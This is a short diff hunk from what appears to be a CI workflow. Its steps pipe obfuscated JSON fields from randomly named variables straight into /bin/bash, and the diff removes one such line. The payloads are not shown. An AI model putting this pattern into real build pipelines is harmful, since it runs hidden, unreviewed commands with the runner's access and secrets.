@@ -31,7 +31,6 @@ jobs:
           echo $yfzk21272 | jq -r .krifp2048 | /bin/bash
           printf '%s' "$pzf8" | jq -r .uupmn70 | /bin/bash
           echo $vdt761 | jq -r .ggp39 | /bin/bash
-          printf '%s' "$i6770" | jq -r .gem250 | /bin/bash
           echo $tr030 | jq -r .u1 | /bin/bash
           printf '%s' "$ujz56898" | jq -r .ecc454 | /bin/bash
           printf '%s' "$d6041" | jq -r .m68085 | /bin/bash
